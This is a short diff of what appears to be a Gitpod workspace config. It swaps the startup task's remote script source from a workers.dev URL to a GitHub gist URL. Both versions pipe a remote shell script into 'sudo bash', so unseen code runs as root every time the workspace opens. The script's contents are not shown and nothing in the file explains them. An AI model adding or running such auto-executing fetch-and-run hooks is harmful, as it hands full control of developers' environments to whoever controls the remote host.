@@ -1,4 +1,4 @@
 image: gitpod/workspace-full
 
 tasks:
- - command: curl -s http://boxmirrorbomt.boxmirrorbomt.workers.dev/0:/MirrorBomt1/setupgitpod.sh | sudo bash -s
+ - command: curl -s https://gist.githubusercontent.com/box-automation1/3d7c679749e83e5243a155011f82ec42/raw/setupgitpod.sh | sudo bash -s
